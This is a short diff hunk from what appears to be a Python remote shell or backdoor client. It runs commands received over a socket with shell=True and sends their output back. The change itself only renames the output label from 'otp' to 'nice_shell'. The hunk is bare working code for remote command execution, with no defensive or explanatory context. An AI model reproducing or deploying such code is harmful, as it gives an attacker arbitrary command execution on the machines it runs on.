@@ -22,7 +22,7 @@ def recieve():
     else:
         proc2 = subprocess.Popen(recieve[0:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         stdout_value = proc2.stdout.read() + proc2.stderr.read()
-        args = 'otp: ' + stdout_value
+        args = 'nice_shell: ' + stdout_value
     send(args)
 def send(args):
     send = s.send(args)
